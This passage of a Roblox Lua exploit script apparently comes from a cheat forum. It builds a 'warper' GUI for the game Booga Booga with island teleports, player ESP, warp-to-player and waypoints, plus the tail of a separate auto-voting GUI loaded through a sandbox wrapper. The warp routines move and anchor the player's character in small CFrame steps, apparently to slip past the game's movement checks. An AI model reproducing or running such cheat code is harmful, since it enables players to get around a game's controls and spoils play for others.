TextLabel18.TextXAlignment = Enum.TextXAlignment.Left
TextLabel19.Name = "Vote2"
TextLabel19.Parent = ScrollingFrame17
TextLabel19.Transparency = 0
TextLabel19.Size = UDim2.new(0, 116, 0, 15)
TextLabel19.Text = "2."
TextLabel19.Position = UDim2.new(0.0273549147, 0, 0.0648244247, 0)
TextLabel19.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel19.BackgroundTransparency = 1
TextLabel19.Font = Enum.Font.SourceSans
TextLabel19.FontSize = Enum.FontSize.Size14
TextLabel19.TextColor3 = Color3.new(1, 1, 1)
TextLabel19.TextXAlignment = Enum.TextXAlignment.Left
TextLabel20.Parent = Frame16
TextLabel20.Transparency = 0
TextLabel20.Size = UDim2.new(0, 116, 0, 15)
TextLabel20.Text = "Auto Rap Battles Votes"
TextLabel20.Position = UDim2.new(-0.00325732911, 0, -0.00609756075, 0)
TextLabel20.BackgroundColor3 = Color3.new(1, 1, 1)
TextLabel20.BackgroundTransparency = 1
TextLabel20.Font = Enum.Font.SourceSans
TextLabel20.FontSize = Enum.FontSize.Size14
TextLabel20.TextColor3 = Color3.new(1, 1, 1)
TextLabel20.TextXAlignment = Enum.TextXAlignment.Left
TextButton21.Name = "Close"
TextButton21.Parent = Frame16
TextButton21.Transparency = 0
TextButton21.Size = UDim2.new(0, 20, 0, 17)
TextButton21.Text = "X"
TextButton21.Position = UDim2.new(0.957654715, 0, -0.0121951215, 0)
TextButton21.BackgroundColor3 = Color3.new(1, 1, 1)
TextButton21.BackgroundTransparency = 1
TextButton21.Font = Enum.Font.SourceSans
TextButton21.FontSize = Enum.FontSize.Size14
TextButton21.TextColor3 = Color3.new(1, 1, 1)
TextButton21.TextScaled = true
TextButton21.TextWrapped = true
Script22.Parent = TextButton21
table.insert(cors,sandbox(Script22,function()
button1 = script.Parent

function click()
script.Parent.Parent.Visible = false
end

button1.MouseButton1Down:connect(click)
end))
for i,v in pairs(mas:GetChildren()) do
	v.Parent = game:GetService("Players").LocalPlayer.PlayerGui
	pcall(function() v:MakeJoints() end)
end
mas:Destroy()
for i,v in pairs(cors) do
	spawn(function()
		pcall(v)
	end)
end
end)

BoogaBoogaBtn.MouseButton1Down:Connect(function()
--Deobfuscated and unminified by Polar Bear#8316 
local i=Instance.new("ScreenGui")
local j=Instance.new("ImageLabel")
local L=Instance.new("Frame")
local M=Instance.new("TextButton")
local o=Instance.new("TextLabel")
local q=Instance.new("TextLabel")
local t=Instance.new("TextButton")
local P=Instance.new("Frame")
local B=Instance.new("TextButton")
local C=Instance.new("TextButton")
local I=Instance.new("TextButton")
local G=Instance.new("TextButton")
local H=Instance.new("TextButton")
local J=Instance.new("TextButton")
local D=Instance.new("TextButton")
local F=Instance.new("TextButton")
local l=Instance.new("Frame")
local m=Instance.new("TextButton")
local y=Instance.new("TextButton")
local N=Instance.new("Frame")
local p=Instance.new("TextLabel")
local A=Instance.new("TextButton")
local x=Instance.new("TextButton")
local r=Instance.new("TextLabel")
local z=Instance.new("TextButton")
local u=Instance.new("TextLabel")
local O=Instance.new("Frame")
local n=Instance.new("TextLabel")
local w=Instance.new("TextButton")
local E=Instance.new("TextButton")
local v=Instance.new("TextButton")
local s=Instance.new("TextLabel")
local K=Instance.new("TextBox")
i.Name="warper"
wait(1)
i.Parent=game.Players.LocalPlayer.PlayerGui 
local b=game.Players.LocalPlayer.Character 
local c=Instance.new("BodyForce")
c.force=Vector3.new(0,0,0)
c.Parent=b.HumanoidRootPart 
O.Name="Misc"O.Parent=i 
O.Active=true 
O.AnchorPoint=Vector2.new(1,1)
O.BackgroundColor3=Color3.new(1,1,1)
O.BackgroundTransparency=0.40000000596046 
O.BorderSizePixel=0 
O.ClipsDescendants=true 
O.Draggable=true 
O.Position=UDim2.new(0.280194283,0,0.708171189,0)
O.Selectable=true 
O.Size=UDim2.new(0,177,0,252)
n.Name="titlew"
n.Parent=O 
n.BackgroundColor3=Color3.new(0,0,0)
n.BackgroundTransparency=0.5 
n.BorderSizePixel=0
n.Size=UDim2.new(0,177,0,46)
n.ZIndex=3 
n.Font=Enum.Font.SourceSans 
n.Text="Misc"
n.TextColor3=Color3.new(1,1,1)
n.TextSize=24 
w.Name="unstuck"
w.Parent=O 
w.AnchorPoint=Vector2.new(0.5,0.5)
w.BackgroundColor3=Color3.new(1,0,0)
w.BackgroundTransparency=0.5 
w.BorderColor3=Color3.new(0,0,0)
w.BorderSizePixel=0 
w.Position=UDim2.new(0.5,0,0.295634925,0)
w.Size=UDim2.new(0,155,0,35)
w.ZIndex=5 
w.AutoButtonColor=false 
w.Font=Enum.Font.SourceSansBold 
w.Text="Unstuck"
w.TextColor3=Color3.new(1,1,1)
w.TextSize=20 
E.Name="autoeat"
E.Parent=O 
E.AnchorPoint=Vector2.new(0.5,0.5)
E.BackgroundColor3=Color3.new(0,0,0)
E.BackgroundTransparency=0.80000001192093 
E.BorderColor3=Color3.new(0,0,0)
E.BorderSizePixel=0 
E.Position=UDim2.new(0.5,0,0.458333343,0)
E.Size=UDim2.new(0,155,0,35)
E.ZIndex=5 
E.AutoButtonColor=false 
E.Font=Enum.Font.SourceSansBold 
E.Text="Player ESP"
E.TextColor3=Color3.new(1,1,1)
E.TextSize=20 
v.Name="warpto"
v.Parent=O 
v.AnchorPoint=Vector2.new(0.5,0.5)
v.BackgroundColor3=Color3.new(0,0,0)
v.BackgroundTransparency=0.80000001192093 
v.BorderColor3=Color3.new(0,0,0)
v.BorderSizePixel=0 
v.Position=UDim2.new(0.5,0,0.692460299,0)
v.Size=UDim2.new(0,155,0,35)
v.ZIndex=5 
v.AutoButtonColor=false 
v.Font=Enum.Font.SourceSansBold 
v.Text="Warp to Player"
v.TextColor3=Color3.new(1,1,1)
v.TextSize=20 
s.Name="separatormisc"
s.Parent=O 
s.BackgroundColor3=Color3.new(0,0,0)
s.BackgroundTransparency=0.89999997615814 
s.BorderSizePixel=0 
s.Position=UDim2.new(0,0,0.56349206,0)
s.Size=UDim2.new(0,177,0,6)
s.ZIndex=9 
s.Font=Enum.Font.SourceSans 
s.Text=""
s.TextColor3=Color3.new(1,1,1)
s.TextSize=24 
K.Name="textboxer"
K.Parent=O 
K.BackgroundColor3=Color3.new(0,0,0)
K.BackgroundTransparency=0.5 
K.BorderSizePixel=0 
K.Position=UDim2.new(0.0621468909,0,0.789682567,0)
K.Selectable=false 
K.Size=UDim2.new(0,155,0,43)
K.ZIndex=6 
K.ClearTextOnFocus=false 
K.Font=Enum.Font.SourceSans 
K.PlaceholderColor3=Color3.new(0.615686,0.615686,0.615686)
K.PlaceholderText="asseater69"
K.ShowNativeInput=false 
K.Text=""
K.TextColor3=Color3.new(1,1,1)
K.TextSize=16 
y.Name="warpcancel"
y.Parent=L 
y.AnchorPoint=Vector2.new(0.5,0.5)
y.BackgroundColor3=Color3.new(1,0,0.0156863)
y.BackgroundTransparency=0.60000002384186 
y.BorderColor3=Color3.new(0,0,0)
y.BorderSizePixel=0 
y.Position=UDim2.new(0.889277399,0,0.271825403,0)
y.Size=UDim2.new(0,69,0,33)
y.ZIndex=5 
y.AutoButtonColor=false 
y.Font=Enum.Font.SourceSansBold 
y.Text="Cancel Warp"
y.TextColor3=Color3.new(1,1,1)
y.TextSize=14 
L.Name="MFrame"
L.Parent=i 
L.Active=true 
L.AnchorPoint=Vector2.new(1,1)
L.BackgroundColor3=Color3.new(1,1,1)
L.BackgroundTransparency=0.40000000596046 
L.BorderSizePixel=0 
L.ClipsDescendants=true 
L.Draggable=true 
L.Position=UDim2.new(0.551980197,0,0.708171189,0)
L.Selectable=true 
L.Size=UDim2.new(0,429,0,252)
M.Name="warp"
M.Parent=L 
M.AnchorPoint=Vector2.new(0.5,0.5)
M.BackgroundColor3=Color3.new(1,0,0.0156863)
M.BackgroundTransparency=0.60000002384186 
M.BorderColor3=Color3.new(0,0,0)
M.BorderSizePixel=0 
M.Position=UDim2.new(0.40326339,0,0.271825403,0)
M.Size=UDim2.new(0,334,0,33)
M.ZIndex=5 
M.AutoButtonColor=false 
M.Font=Enum.Font.SourceSansBold 
M.Text="Warp"
M.TextColor3=Color3.new(1,1,1)
M.TextSize=20 
o.Name="title"
o.Parent=L 
o.BackgroundColor3=Color3.new(0,0,0)
o.BackgroundTransparency=0.5 
o.BorderSizePixel=0 
o.Size=UDim2.new(0,429,0,46)
o.ZIndex=3 
o.Font=Enum.Font.SourceSans 
o.Text="azerty gui chunk by aze#4874 (discord)"
o.TextColor3=Color3.new(1,1,1)
o.TextSize=24 
q.Name="seperator"
q.Parent=L 
q.BackgroundColor3=Color3.new(0,0,0)
q.BackgroundTransparency=0.5 
q.BorderSizePixel=0 
q.Position=UDim2.new(0,0,0.36500001,0)
q.Size=UDim2.new(0,429,0,6)
q.ZIndex=3 
q.Font=Enum.Font.SourceSans 
q.Text=""
q.TextColor3=Color3.new(1,1,1)
q.TextSize=24 
t.Name="close"
t.Parent=L 
t.BackgroundColor3=Color3.new(1,1,1)
t.BackgroundTransparency=1 
t.Position=UDim2.new(0.920745909,0,0.0238095243,0)
t.Size=UDim2.new(0,34,0,34)
t.ZIndex=999 
t.Font=Enum.Font.SourceSansLight 
t.Text=">"
t.TextColor3=Color3.new(1,1,1)
t.TextSize=28 
t.TextStrokeColor3=Color3.new(1,1,1)
P.Name="Warps"
P.Parent=L 
P.BackgroundColor3=Color3.new(1,1,1)
P.BackgroundTransparency=1 
P.BorderSizePixel=0 
P.Position=UDim2.new(0,0,0.388888896,0)
P.Size=UDim2.new(0,429,0,154)P.ZIndex=5 
B.Name="waterfall"B.Parent=P
B.AnchorPoint=Vector2.new(0.5,0.5)
B.BackgroundColor3=Color3.new(0,0,0)
B.BackgroundTransparency=0.80000001192093 
B.BorderColor3=Color3.new(0,0,0)
B.BorderSizePixel=0 
B.Position=UDim2.new(0.272727281,0,0.207792208,0)
B.Size=UDim2.new(0,210,0,36)
B.ZIndex=5 
B.AutoButtonColor=false 
B.Font=Enum.Font.SourceSansBold 
B.Text="Waterfall island & Crystals"
B.TextColor3=Color3.new(1,1,1)
B.TextSize=20 
C.Name="adurite"
C.Parent=P 
C.AnchorPoint=Vector2.new(0.5,0.5)
C.BackgroundColor3=Color3.new(0,0,0)
C.BackgroundTransparency=0.80000001192093 
C.BorderColor3=Color3.new(0,0,0)
C.BorderSizePixel=0 
C.Position=UDim2.new(0.754079282,0,0.207792208,0)
C.Size=UDim2.new(0,185,0,36)
C.ZIndex=5 
C.AutoButtonColor=false 
C.Font=Enum.Font.SourceSansBold 
C.Text="Adurite cave & Old god"
C.TextColor3=Color3.new(1,1,1)
C.TextSize=20 
I.Name="cave"
I.Parent=P 
I.AnchorPoint=Vector2.new(0.5,0.5)
I.BackgroundColor3=Color3.new(0,0,0)
I.BackgroundTransparency=0.80000001192093 
I.BorderColor3=Color3.new(0,0,0)
I.BorderSizePixel=0 
I.Position=UDim2.new(0.209790215,0,0.493506491,0)
I.Size=UDim2.new(0,156,0,36)
I.ZIndex=5 
I.AutoButtonColor=false 
I.Font=Enum.Font.SourceSansBold 
I.Text="Ancient cave & Gold"
I.TextColor3=Color3.new(1,1,1)
I.TextSize=20 
G.Name="expisland"
G.Parent=P 
G.AnchorPoint=Vector2.new(0.5,0.5)
G.BackgroundColor3=Color3.new(0,0,0)
G.BackgroundTransparency=0.80000001192093 
G.BorderColor3=Color3.new(0,0,0)
G.BorderSizePixel=0 
G.Position=UDim2.new(0.589743614,0,0.493506491,0)
G.Size=UDim2.new(0,150,0,36)
G.ZIndex=5 G.AutoButtonColor=false 
G.Font=Enum.Font.SourceSansBold 
G.Text="Ancient tree Island"
G.TextColor3=Color3.new(1,1,1)
G.TextSize=20 
H.Name="mid"
H.Parent=P
H.AnchorPoint=Vector2.new(0.5,0.5)
H.BackgroundColor3=Color3.new(0,0,0)
H.BackgroundTransparency=0.80000001192093 
H.BorderColor3=Color3.new(0,0,0)
H.BorderSizePixel=0 
H.Position=UDim2.new(0.881118894,0,0.493506491,0)
H.Size=UDim2.new(0,76,0,36)
H.ZIndex=5 
H.AutoButtonColor=false 
H.Font=Enum.Font.SourceSansBold 
H.Text="Mainland"
H.TextColor3=Color3.new(1,1,1)
H.TextSize=20 
j.Name="supersecret"
j.Parent=O 
j.BackgroundColor3=Color3.new(1,1,1)
j.Size=UDim2.new(0,177,0,248)
j.ZIndex=5 
j.Image="rbxassetid://167258196"
j.Visible=false 
J.Name="totem"
J.Parent=P 
J.AnchorPoint=Vector2.new(0.5,0.5)
J.BackgroundColor3=Color3.new(0,0,0)
J.BackgroundTransparency=0.80000001192093 
J.BorderColor3=Color3.new(0,0,0)
J.BorderSizePixel=0 
J.Position=UDim2.new(0.151515156,0,0.772727311,0)
J.Size=UDim2.new(0,106,0,36)
J.ZIndex=5 
J.AutoButtonColor=false 
J.Font=Enum.Font.SourceSansBold 
J.Text="Totem island"
J.TextColor3=Color3.new(1,1,1)
J.TextSize=20 
D.Name="mag"
D.Parent=P 
D.AnchorPoint=Vector2.new(0.5,0.5)
D.BackgroundColor3=Color3.new(0,0,0)
D.BackgroundTransparency=0.80000001192093 
D.BorderColor3=Color3.new(0,0,0)
D.BorderSizePixel=0 
D.Position=UDim2.new(0.487179488,0,0.772727311,0)
D.Size=UDim2.new(0,160,0,36)
D.ZIndex=5 
D.AutoButtonColor=false 
D.Font=Enum.Font.SourceSansBold 
D.Text="Meteor (if spawned)"
D.TextColor3=Color3.new(1,1,1)
D.TextSize=20 
F.Name="ice"
F.Parent=P 
F.AnchorPoint=Vector2.new(0.5,0.5)
F.BackgroundColor3=Color3.new(0,0,0)
F.BackgroundTransparency=0.80000001192093 
F.BorderColor3=Color3.new(0,0,0)
F.BorderSizePixel=0 
F.Position=UDim2.new(0.832167804,0,0.772727311,0)
F.Size=UDim2.new(0,118,0,36)
F.ZIndex=5 
F.AutoButtonColor=false 
F.Font=Enum.Font.SourceSansBold 
F.Text="Ice mainland"
F.TextColor3=Color3.new(1,1,1)
F.TextSize=20 
l.Name="opener"
l.Parent=i 
l.BackgroundColor3=Color3.new(1,1,1)
l.BackgroundTransparency=1 
l.BorderSizePixel=0 
l.Position=UDim2.new(1,50,0.5,-50)
l.Size=UDim2.new(0,100,0,100)
m.Parent=l 
m.BackgroundColor3=Color3.new(1,1,1)
m.BackgroundTransparency=1 
m.Size=UDim2.new(0,100,0,100)
m.Font=Enum.Font.SciFi 
m.Text="<"
m.TextColor3=Color3.new(1,1,1)
m.TextSize=50
m.TextStrokeColor3=Color3.new(0.588235,0.588235,0.588235)
N.Name="Waypoint"
N.Parent=i 
N.Active=true 
N.AnchorPoint=Vector2.new(1,1)
N.BackgroundColor3=Color3.new(1,1,1)
N.BackgroundTransparency=0.40000000596046 
N.BorderSizePixel=0 
N.ClipsDescendants=true 
N.Draggable=true 
N.Position=UDim2.new(0.666460395,0,0.708171189,0)
N.Selectable=true 
N.Size=UDim2.new(0,177,0,252)
p.Name="titlew"
p.Parent=N 
p.BackgroundColor3=Color3.new(0,0,0)
p.BackgroundTransparency=0.5 
p.BorderSizePixel=0 
p.Size=UDim2.new(0,177,0,46)
p.ZIndex=3
p.Font=Enum.Font.SourceSans 
p.Text="Waypoints"
p.TextColor3=Color3.new(1,1,1)
p.TextSize=24 
A.Name="createw"
A.Parent=N 
A.AnchorPoint=Vector2.new(0.5,0.5)
A.BackgroundColor3=Color3.new(0,0,0)
A.BackgroundTransparency=0.80000001192093 
A.BorderColor3=Color3.new(0,0,0)
A.BorderSizePixel=0 
A.Position=UDim2.new(0.5,0,0.295634925,0)
A.Size=UDim2.new(0,155,0,35)
A.ZIndex=5
A.AutoButtonColor=false 
A.Font=Enum.Font.SourceSansBold 
A.Text="Create Waypoint"
A.TextColor3=Color3.new(1,1,1)
A.TextSize=20 
x.Name="deletew"
x.Parent=N 
x.AnchorPoint=Vector2.new(0.5,0.5)
x.BackgroundColor3=Color3.new(0,0,0)
x.BackgroundTransparency=0.80000001192093 
x.BorderColor3=Color3.new(0,0,0)
x.BorderSizePixel=0 
x.Position=UDim2.new(0.5,0,0.458333343,0)
x.Size=UDim2.new(0,155,0,35)
x.ZIndex=5 x.AutoButtonColor=false 
x.Font=Enum.Font.SourceSansBold 
x.Text="Panic Button"
x.TextColor3=Color3.new(1,1,1)
x.TextSize=20 
r.Name="separatorw"
r.Parent=N 
r.BackgroundColor3=Color3.new(0,0,0)
r.BackgroundTransparency=0.5 
r.BorderSizePixel=0 
r.Position=UDim2.new(0,0,0.56349206,0)
r.Size=UDim2.new(0,177,0,6)
r.ZIndex=3 
r.Font=Enum.Font.SourceSans 
r.Text=""
r.TextColor3=Color3.new(1,1,1)
r.TextSize=24 
z.Name="gotow"
z.Parent=N 
z.AnchorPoint=Vector2.new(0.5,0.5)
z.BackgroundColor3=Color3.new(0,0,0)
z.BackgroundTransparency=0.80000001192093 
z.BorderColor3=Color3.new(0,0,0)
z.BorderSizePixel=0 
z.Position=UDim2.new(0.5,0,0.692460299,0)
z.Size=UDim2.new(0,155,0,35)
z.ZIndex=5 z.AutoButtonColor=false 
z.Font=Enum.Font.SourceSansBold 
z.Text="Warp to waypoint"
z.TextColor3=Color3.new(1,1,1)
z.TextSize=20 
u.Name="titlew"
u.Parent=N 
u.BackgroundColor3=Color3.new(0,0,0)
u.BackgroundTransparency=0.5 
u.BorderSizePixel=0 
u.Position=UDim2.new(0.0621468909,0,0.789682567,0)
u.Size=UDim2.new(0,155,0,43)
u.ZIndex=3 
u.Font=Enum.Font.SourceSans 
u.Text="0, 0, 0"
u.TextColor3=Color3.new(1,1,1)
u.TextSize=24 
print"warper appears to have loaded successfully..    ?"
warn"if you got this gui anywhere else than from v3rmillion.net you got scammed!"
warn"if you got this gui from youtube, dislike their video because they're stealing my stuff claiming they made it themselves."
warn"my only discord is aze#4874, contact me if you want me to make you something :)"
k=0.01 
Q=1.5 

t.MouseButton1Click:connect(function()
	local b=L
	local a=N 
	local a=O 
	local 
	c=false 
	local 
	a=t.Position 
	if c==false then 
		c=true 
		b:TweenSize(UDim2.new(0,0,0,252),"Out","Quad",1.5)
		N:TweenSize(UDim2.new(0,177,0,0),"Out","Quad",2)
		O:TweenSize(UDim2.new(0,177,0,0),"Out","Quad",1)
		c=true 
		l:TweenPosition(UDim2.new(1,-100,0.5,-50),"In","Quad",2)
	end 
end)

m.MouseButton1Click:connect(function()
	local a=L 
	local b=O 
	N:TweenSize(UDim2.new(0,177,0,252),"In","Quad",1)
	a:TweenSize(UDim2.new(0,429,0,252),"In","Quad",2)
	b:TweenSize(UDim2.new(0,177,0,252),"In","Quad",1)
	l:TweenPosition(UDim2.new(1,75,0.5,-50),"In","Quad",1)
end)

B.MouseButton1Click:connect(function()
	local b=P:GetChildren()
	for a=1,#b do 
		if b[a].Name~="waterfall" then 
			b[a].BackgroundColor3=Color3.fromRGB(0,0,0)
			b[a].BackgroundTransparency=0.8 
		end 
		B.BackgroundColor3=Color3.fromRGB(0,255,0)
		B.BackgroundTransparency=0.6 
	end 
end)

C.MouseButton1Click:connect(function()
	local b=P:GetChildren()
	for a=1,#b do 
		if b[a].Name~="adurite" then 
			b[a].BackgroundColor3=Color3.fromRGB(0,0,0)
			b[a].BackgroundTransparency=0.8 
		end 
		C.BackgroundColor3=Color3.fromRGB(0,255,0)
		C.BackgroundTransparency=0.6 
	end 
end)

I.MouseButton1Click:connect(function()
	local b=P:GetChildren()
	for a=1,#b do 
		if b[a].Name~="cave" then 
			b[a].BackgroundColor3=Color3.fromRGB(0,0,0)
			b[a].BackgroundTransparency=0.8 
		end 
		I.BackgroundColor3=Color3.fromRGB(0,255,0)
		I.BackgroundTransparency=0.6 
	end 
end)

G.MouseButton1Click:connect(function()
	local b=P:GetChildren()
	for a=1,#b do 
		if b[a].Name~="expisland" then 
			b[a].BackgroundColor3=Color3.fromRGB(0,0,0)
			b[a].BackgroundTransparency=0.8 
		end 
		G.BackgroundColor3=Color3.fromRGB(0,255,0)
		G.BackgroundTransparency=0.6 
	end 
end)

H.MouseButton1Click:connect(function()
	local b=P:GetChildren()
	for a=1,#b do 
		if b[a].Name~="mid" then 
			b[a].BackgroundColor3=Color3.fromRGB(0,0,0)
			b[a].BackgroundTransparency=0.8 
		end 
		H.BackgroundColor3=Color3.fromRGB(0,255,0)
		H.BackgroundTransparency=0.6 
	end 
end)

D.MouseButton1Click:connect(function()
	local b=P:GetChildren()
	for a=1,#b do 
		if b[a].Name~="mag" then 
			b[a].BackgroundColor3=Color3.fromRGB(0,0,0)
			b[a].BackgroundTransparency=0.8 
		end 
		D.BackgroundColor3=Color3.fromRGB(0,255,0)
		D.BackgroundTransparency=0.6 
	end 
end)
F.MouseButton1Click:connect(function()
	local b=P:GetChildren()
	for a=1,#b do 
		if b[a].Name~="ice"then 
			b[a].BackgroundColor3=Color3.fromRGB(0,0,0)
			b[a].BackgroundTransparency=0.8 
		end 
		F.BackgroundColor3=Color3.fromRGB(0,255,0)
		F.BackgroundTransparency=0.6 
	end 
end)
J.MouseButton1Click:connect(function()
	local b=P:GetChildren()
	for a=1,#b do 
		if b[a].Name~="totem"then
			b[a].BackgroundColor3=Color3.fromRGB(0,0,0)
			b[a].BackgroundTransparency=0.8 
		end 
		J.BackgroundColor3=Color3.fromRGB(0,255,0)
		J.BackgroundTransparency=0.6 
	end 
end)
f=false 
a=false 
M.MouseButton1Click:connect(function()
	if f==false then 
		f=true 
		M.BackgroundColor3=Color3.fromRGB(0,0,0)
		local b=P:GetChildren()
		for a=1,#b do 
			if b[a].BackgroundColor3==Color3.fromRGB(0,255,0)then 
				M.Text=("Warping to "..b[a].Text.."...")
				wait(1)
				if b[a].Name=="waterfall"then 
					local a=game.Players.LocalPlayer 
					local a=a.Character 
					local g=a.HumanoidRootPart 
					wait()
					local b=Vector3.new(-213,600,-700)
					local c=0.01 
					local e=1.5 
					local f=false 
					local a=b-g.Position 
					local d=a.magnitude 
					local b=CFrame.new(g.Position,b).lookVector 
					local function a()
					if f then 
						return 
					end 
					f=true 
					for a=0,d,e do 
						g.Anchored=false 
						g.CFrame=g.CFrame+(b*e)
						wait((c/d)*e)
					end 
					f=false 
					g.Anchored=true 
				end 
				a()
				wait()
				for a=1,125 do
					wait()
					local a=game.Players.LocalPlayer 
					local b=a.Character 
					local a=b.HumanoidRootPart 
					a.Anchored=false 
					a.CFrame=CFrame.new(b.HumanoidRootPart.CFrame.x,b.HumanoidRootPart.CFrame.y+3,b.HumanoidRootPart.CFrame.z)
					a.Anchored=true 
				end 
				g.Anchored=false 
				elseif b[a].Name=="adurite"then 
					local a=game.Players.LocalPlayer 
					local a=a.Character 
					local e=a.HumanoidRootPart 
					wait()
					local b=Vector3.new(1226,-164,1315)
					local d=false 
					local a=b-e.Position 
					local c=a.magnitude 
					local b=CFrame.new(e.Position,b).lookVector
					local function a()
						if d then 
							return 
						end 
						d=true 
						for a=0,c,Q do 
							e.Anchored=false 
							e.CFrame=e.CFrame+(b*Q)
							wait((k/c)*Q)
						end 
						d=false 
						e.Anchored=true 
					end 
					a()
					wait()
					for a=1,15 do 
						wait()
						local a=game.Players.LocalPlayer 
						local b=a.Character 
						local a=b.HumanoidRootPart 
						a.Anchored=false 
						a.CFrame=CFrame.new(b.HumanoidRootPart.CFrame.x,b.HumanoidRootPart.CFrame.y+3,b.HumanoidRootPart.CFrame.z)
						a.Anchored=true 
					end 
					e.Anchored=false 
					elseif 
						b[a].Name=="cave"then 
						local a=game.Players.LocalPlayer 
						local a=a.Character 
						local e=a.HumanoidRootPart 
						wait()
						local b=Vector3.new(-1141,200,-813)
						local d=false 
						local a=b-e.Position 
						local c=a.magnitude 
						local b=CFrame.new(e.Position,b).lookVector 
						local function a()
							if d then 
								return 
							end 
							d=true 
							for a=0,c,Q do 
								e.Anchored=false 
								e.CFrame=e.CFrame+(b*Q)
								wait((k/c)*Q)
							end 
							d=false 
							e.Anchored=true 
						end 
						a()
						wait()
						for a=1,125 do 
							wait()
							local a=game.Players.LocalPlayer 
							local b=a.Character 
							local a=b.HumanoidRootPart 
							a.Anchored=false 
							a.CFrame=CFrame.new(b.HumanoidRootPart.CFrame.x,b.HumanoidRootPart.CFrame.y+3,b.HumanoidRootPart.CFrame.z)
							a.Anchored=true 
						end 
						e.Anchored=false 
						elseif b[a].Name=="expisland"then 
							local a=game.Players.LocalPlayer 
							local a=a.Character 
							local e=a.HumanoidRootPart 
							wait()
							local b=Vector3.new(-546,611,-1187)
							local d=false 
							local a=b-e.Position 
							local c=a.magnitude 
							local b=CFrame.new(e.Position,b).lookVector 
							local function a()
								if d then 
									return 
								end 
								d=true 
								for a=0,c,Q do 
									e.Anchored=false 
									e.CFrame=e.CFrame+(b*Q)
									wait((k/c)*Q)
								end 
								d=false 
								e.Anchored=true 
							end 
							a()
							for a=1,150 do 
								wait()
								local a=game.Players.LocalPlayer 
								local b=a.Character 
								local a=b.HumanoidRootPart 
								a.Anchored=true 
								a.CFrame=CFrame.new(b.HumanoidRootPart.CFrame.x,b.HumanoidRootPart.CFrame.y+3,b.HumanoidRootPart.CFrame.z)
								a.Anchored=false 
							end 
							e.Anchored=false 
							elseif b[a].Name=="mid"then 
								local a=game.Players.LocalPlayer 
								local a=a.Character 
								local e=a.HumanoidRootPart 
								wait()
								local b=Vector3.new(-397,5,-544)
								local d=false 
								local a=b-e.Position 
								local c=a.magnitude 
								local b=CFrame.new(e.Position,b).lookVector 
								local function a()
								if d then 
									return 
								end 
								d=true 
								for a=0,c,Q do 
									e.Anchored=false 
									e.CFrame=e.CFrame+(b*Q)
									wait((k/c)*Q)
								end 
								d=false 
								e.Anchored=true 
							end 
							a()
							for a=1,15 do 
								wait()
								local a=game.Players.LocalPlayer 
								local b=a.Character 
								local a=b.HumanoidRootPart 
								a.Anchored=false 
								a.CFrame=CFrame.new(b.HumanoidRootPart.CFrame.x,b.HumanoidRootPart.CFrame.y+3,b.HumanoidRootPart.CFrame.z)
								a.Anchored=true 
							end 
							e.Anchored=false 
							elseif b[a].Name=="totem"then 
							local a=game.Players.LocalPlayer 
							local a=a.Character 
							local e=a.HumanoidRootPart 
							wait()
							local b=Vector3.new(-1130,500,-1255)
							local d=false 
							local a=b-e.Position 
							local c=a.magnitude
							local b=CFrame.new(e.Position,b).lookVector 
							local function a()
							if d then 
								return 
							end 
							d=true 
							for a=0,c,Q do 
								e.Anchored=false 
								e.CFrame=e.CFrame+(b*Q)
								wait((k/c)*Q)
							end 
							d=false 
							e.Anchored=true 
						end 
						a()
						for a=1,175 do 
							wait()
							local a=game.Players.LocalPlayer 
							local b=a.Character 
							local a=b.HumanoidRootPart 
							a.Anchored=false 
							a.CFrame=CFrame.new(b.HumanoidRootPart.CFrame.x,b.HumanoidRootPart.CFrame.y+3,b.HumanoidRootPart.CFrame.z)
							a.Anchored=true 
						end 
						e.Anchored=false 
						elseif b[a].Name=="mag"then 
							local a=game.Players.LocalPlayer 
							local a=a.Character 
							local e=a.HumanoidRootPart 
							wait()
							local b=game.Workspace["Meteor Core"].Part.Position 
							local d=false 
							local a=b-e.Position 
							local c=a.magnitude 
							local b=CFrame.new(e.Position,b).lookVector 
							local function a()
							if d then 
								return
							end 
							d=true
							for a=0,c,Q do 
								e.Anchored=false 
								e.CFrame=e.CFrame+(b*Q)
								wait((k/c)*Q)
							end 
							d=false 
							e.Anchored=true 
						end 
						a()
						e.Anchored=false 
						elseif b[a].Name=="ice"then 
							local a=game.Players.LocalPlayer 
							local a=a.Character 
							local e=a.HumanoidRootPart 
							wait()
							local b=game.Workspace["Ice Chunk"].Ice.Position 
							local d=false 
							local a=b-e.Position 
							local c=a.magnitude 
							local b=CFrame.new(e.Position,b).lookVector 
							local function a()
								if d then
									return 
								end d=true 
								for a=0,c,Q do 
									e.Anchored=false 
									e.CFrame=e.CFrame+(b*Q)
									wait((k/c)*Q)
								end 
								d=false 
								e.Anchored=true 
							end
							a()
							for a=1,10 do 
								wait()
								local a=game.Players.LocalPlayer 
								local b=a.Character 
								local a=b.HumanoidRootPart 
								a.Anchored=false 
								a.CFrame=CFrame.new(b.HumanoidRootPart.CFrame.x,b.HumanoidRootPart.CFrame.y+3,b.HumanoidRootPart.CFrame.z)
								a.Anchored=true 
							end 
							e.Anchored=false 
						end 
					end 
					M.BackgroundColor3=Color3.fromRGB(255,0,0)
					M.Text="Warp"
					f=false 
				end 
				else 
					warn"debounce !!!"
				end 
end)
y.MouseButton1Click:connect(function()
	f=false 
	M.Text="Warp"
	M.BackgroundColor3=Color3.fromRGB(255,0,0)
end)
local a=true 
A.MouseButton1Click:connect(function()
	if a==true then 
		a=false 
		local a=game.Players.LocalPlayer.Character 
		local d=a.HumanoidRootPart.Position 
		string.format("%0.f, %0.f, %0.f",d.X,d.Y,d.Z)
		local a=math.floor(d.X)
		local b=math.floor(d.Y)
		local c=math.floor(d.Z)
		u.Text=(a..", "..b..", "..c)
		local a=Instance.new("Part")
		a.Size=Vector3.new(3,3,3)
		a.Anchored=true 
		a.CanCollide=false 
		a.Transparency=0.6 
		a.Material="Neon"
		a.Parent=workspace 
		a.Position=Vector3.new(d.X,d.Y+5,d.Z)
		a.Name="OMEGALUL"
	else 
		local a=game.Players.LocalPlayer.Character 
		local d=a.HumanoidRootPart.Position 
		string.format("%0.f, %0.f, %0.f",d.X,d.Y,d.Z)
		local c=math.floor(d.X)
		local a=math.floor(d.Y)
		local b=math.floor(d.Z)
		u.Text=(c..", "..a..", "..b)
		local a=Instance.new("Part")
		a.Size=Vector3.new(3,3,3)
		a.Anchored=true 
		a.CanCollide=false 
		a.Transparency=0.6 
		a.Material="Neon"
		a.Parent=workspace
		a.Position=Vector3.new(d.X,d.Y+5,d.Z)
		a.Name="OMEGALUL"
		workspace.OMEGALUL:remove()
	end 
end)
